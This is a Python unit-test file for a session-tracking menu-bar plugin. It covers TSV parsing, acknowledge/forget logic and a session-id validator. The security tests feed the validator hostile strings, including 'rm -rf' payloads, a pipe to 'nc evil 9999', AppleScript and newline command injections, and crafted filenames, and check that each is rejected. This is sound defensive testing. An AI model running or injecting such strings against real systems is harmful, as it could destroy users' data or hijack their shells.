"""Sidecar TSV parsing: state, clicks, ack/dismiss/forget, id validation.

Split out of the original monolithic ``test_plugin.py``.
Stdlib only — run with ``/usr/bin/python3 -m unittest discover -s tests``.
"""

from __future__ import annotations

import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

from _helpers import plugin, _make_session


class TestParseSidecar(unittest.TestCase):
    def test_valid_row(self):
        # 6-column row: state_since is parsed independently of last_event_ts,
        # so the plugin can render "has been working for N seconds" even after
        # multiple PreToolUse events have bumped last_event_ts.
        raw = "sid1\tworking\t1700000050\tPreToolUse\t/tmp\t1700000000\n"
        result = plugin._parse_sidecar(raw)
        self.assertEqual(set(result), {"sid1"})
        snap = result["sid1"]
        self.assertEqual(snap.state, "working")
        self.assertEqual(snap.last_event_ts, 1700000050)
        self.assertEqual(snap.last_event_kind, "PreToolUse")
        self.assertEqual(snap.cwd, "/tmp")
        self.assertEqual(snap.state_since, 1700000000)

    def test_legacy_five_column_row_defaults_state_since_to_ts(self):
        # Rows written by the pre-state_since hook version must still parse;
        # treating state_since == last_event_ts means duration starts counting
        # afresh from the next hook event, which is the safest fallback.
        raw = "sid1\tworking\t1700000000\tPreToolUse\t/tmp\n"
        snap = plugin._parse_sidecar(raw)["sid1"]
        self.assertEqual(snap.state_since, 1700000000)

    def test_garbage_state_since_falls_back_to_ts(self):
        raw = "sid1\tworking\t1700000000\tPreToolUse\t/tmp\tnope\n"
        snap = plugin._parse_sidecar(raw)["sid1"]
        self.assertEqual(snap.state_since, 1700000000)

    def test_invalid_state_skipped(self):
        raw = "sid1\tbogus\t1700000000\tPreToolUse\t/tmp\n"
        self.assertEqual(plugin._parse_sidecar(raw), {})

    def test_non_int_timestamp_skipped(self):
        raw = "sid1\tworking\tnot-a-number\tPreToolUse\t/tmp\n"
        self.assertEqual(plugin._parse_sidecar(raw), {})

    def test_too_few_columns_skipped(self):
        raw = "sid1\tworking\t1700000000\n"
        self.assertEqual(plugin._parse_sidecar(raw), {})

    def test_multiple_rows_independent(self):
        raw = (
            "sid1\tworking\t1700000000\tPreToolUse\t/tmp\n"
            "sid2\tidle\t1700001000\tStop\t/var\n"
        )
        result = plugin._parse_sidecar(raw)
        self.assertEqual(set(result), {"sid1", "sid2"})
        self.assertEqual(result["sid2"].state, "idle")

    def test_last_write_wins(self):
        raw = (
            "sid1\tworking\t1700000000\tPreToolUse\t/a\n"
            "sid1\tidle\t1700000100\tStop\t/a\n"
        )
        result = plugin._parse_sidecar(raw)
        self.assertEqual(result["sid1"].state, "idle")
        self.assertEqual(result["sid1"].last_event_ts, 1700000100)



class TestParseClicks(unittest.TestCase):
    def test_valid_row(self):
        raw = "sid1\t1700000123\n"
        self.assertEqual(plugin._parse_clicks(raw), {"sid1": 1700000123})

    def test_non_int_timestamp_skipped(self):
        # Garbage in one row must not poison the others.
        raw = "sid1\tbroken\nsid2\t1700000200\n"
        self.assertEqual(plugin._parse_clicks(raw), {"sid2": 1700000200})

    def test_too_few_columns_skipped(self):
        self.assertEqual(plugin._parse_clicks("sid1\n"), {})

    def test_last_write_wins(self):
        # The recorder rewrites the row in place, but if a duplicate ever
        # leaked through the lock we'd still want the latest entry.
        raw = "sid1\t1700000000\nsid1\t1700000050\n"
        self.assertEqual(plugin._parse_clicks(raw), {"sid1": 1700000050})



class TestAckFresh(unittest.TestCase):
    """*Tools → Acknowledge all* must only touch sessions currently in 🟢.

    ``ack_fresh`` reuses :func:`collect_sessions` for its source of truth,
    so the tests have to set up a tiny fake of the on-disk layout: one
    JSONL per session under a mocked ``PROJECTS_DIR``, plus a sidecar
    TSV row for non-idle sessions. JSONL mtimes are stamped explicitly
    so age computations are deterministic.
    """

    def setUp(self):
        import tempfile
        self._tmpdir = Path(tempfile.mkdtemp())
        projects = self._tmpdir / "projects"
        projects.mkdir()
        sidecar = self._tmpdir / "state.tsv"
        clicks = self._tmpdir / "clicks.tsv"
        dismiss = self._tmpdir / "dismiss"
        self._orig_projects = plugin.PROJECTS_DIR
        self._orig_sidecar = plugin.SIDECAR_PATH
        self._orig_clicks = plugin.CLICKS_PATH
        self._orig_dismiss = plugin.DISMISS_PATH
        self._orig_sidecar_lock = plugin._SIDECAR_LOCK_DIR
        self._orig_clicks_lock = plugin._CLICKS_LOCK_DIR
        plugin.core.PROJECTS_DIR = projects
        plugin.core.SIDECAR_PATH = sidecar
        plugin.core.CLICKS_PATH = clicks
        # Redirect DISMISS_PATH too — without this the user's real cutoff
        # file (set by *Forget all sessions*) leaks into the test and
        # filters out every fake session whose synthetic ``now`` predates
        # the real cutoff.
        plugin.core.DISMISS_PATH = dismiss
        plugin.core._SIDECAR_LOCK_DIR = sidecar.with_suffix(sidecar.suffix + ".lock.d")
        plugin.core._CLICKS_LOCK_DIR = clicks.with_suffix(clicks.suffix + ".lock.d")
        self.projects = projects
        self.sidecar = sidecar
        self.clicks = clicks
        self.now = 1_700_000_000
        self.fresh = plugin.CONFIG.fresh_sec

    def tearDown(self):
        import shutil
        plugin.core.PROJECTS_DIR = self._orig_projects
        plugin.core.SIDECAR_PATH = self._orig_sidecar
        plugin.core.CLICKS_PATH = self._orig_clicks
        plugin.core.DISMISS_PATH = self._orig_dismiss
        plugin.core._SIDECAR_LOCK_DIR = self._orig_sidecar_lock
        plugin.core._CLICKS_LOCK_DIR = self._orig_clicks_lock
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def _make_session(self, sid, mtime, sidecar_row=None):
        """Create a JSONL on disk with the given mtime, plus optional sidecar row.

        ``sidecar_row`` items: ``(state, ts)``. When ``None`` the session
        has no sidecar entry and falls back to JSONL mtime — same path as
        a freshly-finished session whose Stop hook hasn't been
        registered yet.
        """
        project_dir = self.projects / f"-fake-{sid}"
        project_dir.mkdir(parents=True, exist_ok=True)
        jsonl = project_dir / f"{sid}.jsonl"
        jsonl.write_bytes(b"")
        os.utime(jsonl, (mtime, mtime))
        if sidecar_row is not None:
            state, ts = sidecar_row
            existing = self.sidecar.read_text() if self.sidecar.exists() else ""
            self.sidecar.write_text(
                existing + f"{sid}\t{state}\t{ts}\tStop\t/tmp\n",
                encoding="utf-8",
            )

    def _read_clicks(self):
        if not self.clicks.exists():
            return {}
        return plugin._parse_clicks(self.clicks.read_text(encoding="utf-8"))

    def test_promotes_fresh_session(self):
        self._make_session("fresh", self.now - 60, ("idle", self.now - 60))
        self.assertEqual(plugin.ack_fresh(self.now), 1)
        self.assertEqual(self._read_clicks(), {"fresh": self.now})

    def test_session_without_sidecar_row_is_invisible(self):
        # Stronger guarantee than just "not FRESH": after dropping the
        # JSONL-mtime fallback in collect_sessions, a session without a
        # TSV row doesn't appear in the menu at all. Otherwise an IDE
        # tab switch (which updates JSONL mtime as Claude Code appends
        # the SessionStart event) would put the session into the menu
        # as ACK/STALE — exactly the "I just clicked a tab and 9 blue
        # sessions appeared" report this branch fixes.
        self._make_session("untracked", self.now - 60)
        self.assertEqual(plugin.collect_sessions(self.now), [])
        self.assertEqual(plugin.ack_fresh(self.now), 0)
        self.assertEqual(self._read_clicks(), {})

    def test_skips_working_session(self):
        self._make_session("alive", self.now - 5, ("working", self.now - 5))
        self.assertEqual(plugin.ack_fresh(self.now), 0)
        self.assertEqual(self._read_clicks(), {})

    def test_skips_stale_session(self):
        old = self.now - self.fresh - 1
        self._make_session("old", old, ("idle", old))
        self.assertEqual(plugin.ack_fresh(self.now), 0)
        self.assertEqual(self._read_clicks(), {})

    def test_skips_already_clicked_session(self):
        stop_ts = self.now - 60
        self._make_session("seen", stop_ts, ("idle", stop_ts))
        self.clicks.write_text(f"seen\t{stop_ts + 1}\n", encoding="utf-8")
        self.assertEqual(plugin.ack_fresh(self.now), 0)
        self.assertEqual(self._read_clicks(), {"seen": stop_ts + 1})

    def test_mixed_set_targets_only_fresh(self):
        self._make_session("fresh1", self.now - 30, ("idle", self.now - 30))
        self._make_session("fresh2", self.now - 90, ("idle", self.now - 90))
        self._make_session(
            "stale",
            self.now - self.fresh - 100,
            ("idle", self.now - self.fresh - 100),
        )
        self._make_session("active", self.now - 5, ("working", self.now - 5))
        self.assertEqual(plugin.ack_fresh(self.now), 2)
        self.assertEqual(
            self._read_clicks(),
            {"fresh1": self.now, "fresh2": self.now},
        )



class TestReadDismissTs(unittest.TestCase):
    """``read_dismiss_ts`` should fail-open: any read error returns 0."""

    def setUp(self):
        import tempfile
        self._tmp = tempfile.NamedTemporaryFile(
            mode="w", delete=False, suffix=".dismiss"
        )
        self._tmp.close()
        self._original = plugin.DISMISS_PATH
        plugin.core.DISMISS_PATH = Path(self._tmp.name)

    def tearDown(self):
        plugin.core.DISMISS_PATH = self._original
        Path(self._tmp.name).unlink(missing_ok=True)

    def test_missing_file_returns_zero(self):
        Path(self._tmp.name).unlink()
        self.assertEqual(plugin.read_dismiss_ts(), 0)

    def test_valid_timestamp(self):
        Path(self._tmp.name).write_text("1700000123\n", encoding="utf-8")
        self.assertEqual(plugin.read_dismiss_ts(), 1700000123)

    def test_garbage_returns_zero(self):
        # A corrupt cutoff file must not silently hide every live session.
        Path(self._tmp.name).write_text("not-a-number", encoding="utf-8")
        self.assertEqual(plugin.read_dismiss_ts(), 0)



class TestForgetSidecar(unittest.TestCase):
    """Per-row *Forget* hides a session until its ``last_event_ts`` is past
    the recorded ``forget_ts`` — same cutoff semantics as the global dismiss,
    just keyed by session id. A fresh event re-surfaces the row.
    """

    def setUp(self):
        import tempfile
        self._tmpdir = Path(tempfile.mkdtemp())
        projects = self._tmpdir / "projects"
        projects.mkdir()
        sidecar = self._tmpdir / "state.tsv"
        clicks = self._tmpdir / "clicks.tsv"
        forget = self._tmpdir / "forget.tsv"
        dismiss = self._tmpdir / "dismiss"
        self._orig_projects = plugin.PROJECTS_DIR
        self._orig_sidecar = plugin.SIDECAR_PATH
        self._orig_clicks = plugin.CLICKS_PATH
        self._orig_forget = plugin.FORGET_PATH
        self._orig_dismiss = plugin.DISMISS_PATH
        self._orig_sidecar_lock = plugin._SIDECAR_LOCK_DIR
        self._orig_clicks_lock = plugin._CLICKS_LOCK_DIR
        self._orig_forget_lock = plugin._FORGET_LOCK_DIR
        plugin.core.PROJECTS_DIR = projects
        plugin.core.SIDECAR_PATH = sidecar
        plugin.core.CLICKS_PATH = clicks
        plugin.core.FORGET_PATH = forget
        plugin.core.DISMISS_PATH = dismiss
        plugin.core._SIDECAR_LOCK_DIR = sidecar.with_suffix(sidecar.suffix + ".lock.d")
        plugin.core._CLICKS_LOCK_DIR = clicks.with_suffix(clicks.suffix + ".lock.d")
        plugin.core._FORGET_LOCK_DIR = forget.with_suffix(forget.suffix + ".lock.d")
        self.projects = projects
        self.sidecar = sidecar
        self.forget = forget
        self.now = 1_700_000_000

    def tearDown(self):
        import shutil
        plugin.core.PROJECTS_DIR = self._orig_projects
        plugin.core.SIDECAR_PATH = self._orig_sidecar
        plugin.core.CLICKS_PATH = self._orig_clicks
        plugin.core.FORGET_PATH = self._orig_forget
        plugin.core.DISMISS_PATH = self._orig_dismiss
        plugin.core._SIDECAR_LOCK_DIR = self._orig_sidecar_lock
        plugin.core._CLICKS_LOCK_DIR = self._orig_clicks_lock
        plugin.core._FORGET_LOCK_DIR = self._orig_forget_lock
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def _make_session(self, sid, mtime, sidecar_row=None):
        project_dir = self.projects / f"-fake-{sid}"
        project_dir.mkdir(parents=True, exist_ok=True)
        jsonl = project_dir / f"{sid}.jsonl"
        jsonl.write_bytes(b"")
        os.utime(jsonl, (mtime, mtime))
        if sidecar_row is not None:
            state, ts = sidecar_row
            existing = self.sidecar.read_text() if self.sidecar.exists() else ""
            self.sidecar.write_text(
                existing + f"{sid}\t{state}\t{ts}\tStop\t/tmp\n",
                encoding="utf-8",
            )

    def _ids(self, sessions):
        return sorted(s.id for s in sessions)

    def test_missing_file_returns_empty(self):
        # No forget sidecar yet — read_forget must not error.
        self.assertEqual(plugin.read_forget(), {})

    def test_forget_hides_idle_session(self):
        # forget_ts >= last_event_ts ⇒ row is hidden.
        self._make_session("ghost", self.now - 60, ("idle", self.now - 60))
        self.forget.write_text(f"ghost\t{self.now - 30}\n", encoding="utf-8")
        sessions = plugin.collect_sessions(self.now)
        self.assertEqual(self._ids(sessions), [])

    def test_fresh_event_resurfaces_forgotten_session(self):
        # A new event past forget_ts must bring the row back — that's the
        # built-in escape hatch when the user changes their mind.
        self._make_session("ghost", self.now - 10, ("idle", self.now - 10))
        self.forget.write_text(f"ghost\t{self.now - 60}\n", encoding="utf-8")
        sessions = plugin.collect_sessions(self.now)
        self.assertEqual(self._ids(sessions), ["ghost"])

    def test_forget_only_affects_targeted_session(self):
        # The forget map is per-session; siblings keep showing.
        self._make_session("ghost", self.now - 60, ("idle", self.now - 60))
        self._make_session("live", self.now - 30, ("idle", self.now - 30))
        self.forget.write_text(f"ghost\t{self.now - 30}\n", encoding="utf-8")
        sessions = plugin.collect_sessions(self.now)
        self.assertEqual(self._ids(sessions), ["live"])

    def test_orphan_forget_rows_are_gc_d(self):
        # forget rows whose JSONL no longer exists must be dropped on the
        # next collect_sessions pass — otherwise the sidecar would grow
        # forever as sessions get deleted out of band.
        self.forget.write_text(f"gone\t{self.now}\n", encoding="utf-8")
        plugin.collect_sessions(self.now)
        self.assertEqual(plugin.read_forget(), {})

    def test_unparseable_rows_are_skipped(self):
        # Same fail-open stance as read_clicks: a single corrupt row must
        # not hide the rest of the forget set.
        self._make_session("ghost", self.now - 60, ("idle", self.now - 60))
        self.forget.write_text(
            "garbage-line-no-tab\n"
            f"ghost\tnot-an-int\n"
            f"ghost\t{self.now - 30}\n",
            encoding="utf-8",
        )
        sessions = plugin.collect_sessions(self.now)
        self.assertEqual(self._ids(sessions), [])



class TestIsValidSessionId(unittest.TestCase):
    """Allow-list for session ids. The regex is a security boundary: every
    downstream consumer (shell args, AppleScript dialogs, TSV field
    lookups, SwiftBar ``paramN=`` tokens) assumes session ids contain no
    metacharacters. New attack shapes belong here, not as defensive code
    scattered across callers."""

    def test_accepts_uuid_v4(self):
        self.assertTrue(plugin._is_valid_session_id(
            "abcd1234-ab12-4cd3-9ef0-abcdef012345"
        ))

    def test_accepts_short_test_fixture(self):
        # The unit tests across this file use short SIDs like ``sid1``,
        # ``fresh``, ``alive``. The regex must keep accepting them — they
        # contain no metacharacters and the validator is about *shape*,
        # not literal UUID-ness.
        for sid in ("sid1", "fresh", "alive", "untracked", "AB_cd-12"):
            self.assertTrue(
                plugin._is_valid_session_id(sid),
                f"safe fixture {sid!r} must pass",
            )

    def test_rejects_newline_injection(self):
        # The original vector: a JSONL file named with a literal newline
        # would let an attacker who controls ``~/.claude/projects/`` add
        # a second SwiftBar menu row with arbitrary ``shell=`` / ``param``
        # tokens. Reject before the value reaches the renderer.
        self.assertFalse(plugin._is_valid_session_id(
            "abc\nshell=/bin/sh param1=-c"
        ))

    def test_rejects_tab_injection(self):
        # A SID with an embedded tab would shift the TSV columns and let
        # attacker-controlled bytes land in the ``cwd`` / ``state_since``
        # fields. Reject at parse time.
        self.assertFalse(plugin._is_valid_session_id("abc\tworking"))

    def test_rejects_applescript_quote_injection(self):
        # The pre-patch ``delete-session.sh`` spliced ``$SID`` into an
        # ``osascript -e "... ${SID} ..."`` template. A quote here used
        # to break out of the AppleScript string literal.
        self.assertFalse(plugin._is_valid_session_id(
            'abc"; do shell script "rm -rf ~"; --'
        ))

    def test_rejects_shell_metacharacters(self):
        for hostile in (
            "abc;rm -rf /",
            "abc&touch /tmp/pwn",
            "abc|nc evil 9999",
            "abc$(id)",
            "abc`whoami`",
            "abc>/etc/passwd",
            "abc<file",
            "abc*",
            "abc?",
            "abc /",
        ):
            self.assertFalse(
                plugin._is_valid_session_id(hostile),
                f"hostile SID {hostile!r} must be rejected",
            )

    def test_rejects_regex_metacharacters(self):
        # The pre-patch ``grep -v "^${SID}\t"`` interpreted SID as a regex.
        # ``.*`` would have matched every line and wiped the sidecar.
        for hostile in (".*", "^.*$", "abc.def", "abc[ab]c", "abc(d)e"):
            self.assertFalse(
                plugin._is_valid_session_id(hostile),
                f"hostile regex SID {hostile!r} must be rejected",
            )

    def test_rejects_empty(self):
        self.assertFalse(plugin._is_valid_session_id(""))

    def test_rejects_overlong(self):
        # 64-char hard cap keeps log/menu/TSV lines bounded and prevents
        # any attacker-controlled allocation pressure.
        self.assertTrue(plugin._is_valid_session_id("a" * 64))
        self.assertFalse(plugin._is_valid_session_id("a" * 65))



class TestParseSidecarSecurity(unittest.TestCase):
    """``_parse_sidecar`` must drop rows whose SID would weaponise a later
    consumer (shell arg, AppleScript dialog, TSV column shift)."""

    def test_drops_row_with_unsafe_sid(self):
        # A real attacker can't usually get arbitrary bytes into the SID
        # column — the hook writes whatever Claude Code gave it — but a
        # corrupted TSV (half-written write, leftover from a previous
        # schema, hostile process writing to the file) must not blow up
        # the renderer either.
        raw = (
            'evil";do shell script "x";--\tworking\t1700000000\tPreToolUse\t/tmp\n'
            "sid_ok\tworking\t1700000050\tPreToolUse\t/tmp\n"
        )
        result = plugin._parse_sidecar(raw)
        self.assertEqual(set(result), {"sid_ok"})

    def test_drops_row_with_regex_metacharacter_sid(self):
        raw = (
            ".*\tworking\t1700000000\tPreToolUse\t/tmp\n"
            "sid_ok\tworking\t1700000050\tPreToolUse\t/tmp\n"
        )
        self.assertEqual(set(plugin._parse_sidecar(raw)), {"sid_ok"})



class TestLiveSessionIdsSecurity(unittest.TestCase):
    """``_live_session_ids`` reads filenames under ``PROJECTS_DIR``. Any
    process running under the same uid can write there, so the listing
    itself is untrusted input. The validator is what makes the rest of
    the renderer safe to use the result without quoting."""

    def setUp(self):
        import tempfile
        self._tmpdir = Path(tempfile.mkdtemp())
        self._original = plugin.PROJECTS_DIR
        plugin.core.PROJECTS_DIR = self._tmpdir

    def tearDown(self):
        import shutil
        plugin.core.PROJECTS_DIR = self._original
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def test_skips_unsafe_filenames(self):
        project = self._tmpdir / "-fake-proj"
        project.mkdir()
        # Filenames an attacker with write access to ~/.claude/projects/
        # could plausibly create: shell-quote injection and a regex-anchor
        # SID. The validator rejects both; the safe one survives.
        (project / 'evil";do shell script "x";--.jsonl').write_bytes(b"")
        (project / ".*.jsonl").write_bytes(b"")
        (project / "abcd1234-ab12-4cd3-9ef0-abcdef012345.jsonl").write_bytes(b"")
        live = plugin._live_session_ids()
        self.assertEqual(live, {"abcd1234-ab12-4cd3-9ef0-abcdef012345"})


if __name__ == "__main__":
    unittest.main()
